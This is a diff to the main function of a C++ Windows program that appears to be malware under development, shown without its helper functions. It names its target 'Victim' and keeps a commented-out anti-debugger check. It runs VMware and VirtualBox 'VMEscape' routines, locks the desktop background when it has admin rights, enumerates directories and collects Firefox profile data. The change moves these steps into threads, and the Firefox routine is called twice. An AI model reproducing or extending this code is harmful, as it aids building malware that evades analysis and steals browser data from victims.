@@ -7,9 +7,9 @@
 
 int main(int argc, char* argv[]) {
 #ifndef _DEBUG
-//	if (IsDebuggerPresent()) {
-//		exit(EXIT_FAILURE);
-//	}
+	//	if (IsDebuggerPresent()) {
+	//		exit(EXIT_FAILURE);
+	//	}
 	HWND hWindowConsole;
 	AllocConsole();
 	hWindowConsole = FindWindowA("ConsoleWindowClass", NULL);
@@ -19,18 +19,15 @@ int main(int argc, char* argv[]) {
 	std::thread VMWareBoxChange(VMEscape::VMWareEscape);
 	//Check permissions if we are admin, lock backgroundChange
 	std::thread tBackgroundChange(SCH::LockBackground);
-	
-	Victim CurrentComputer;
+
+	Victim* CurrentComputer = new Victim;
 	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
-	//std::thread t_DirectoriesEnumeration(computer->);
-	CurrentComputer.GetDirectoryList();
+	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
+	std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
 	virtualBoxChange.join();
 	VMWareBoxChange.join();
 	tBackgroundChange.join();
-	CurrentComputer.FirefoxProfileList = CurrentComputer.GetFirefoxProfilesList(CurrentComputer.p_FirefoxAppData);
-	for (int i = 0; i < CurrentComputer.FirefoxProfileList.size();i++) {
-			CurrentComputer.FirefoxProfileList[i] = CurrentComputer.GetProfileContent(CurrentComputer.FirefoxProfileList[i]);
-			for (std::wstring const& fileList : CurrentComputer.FirefoxProfileList[i].ProfileFiles) {
-			}
-	}
+	t_DirectoriesEnum.join();
+	CurrentComputer->GetFirefoxProfiles();
+	t_GetFirefoxProfiles.join();
 }
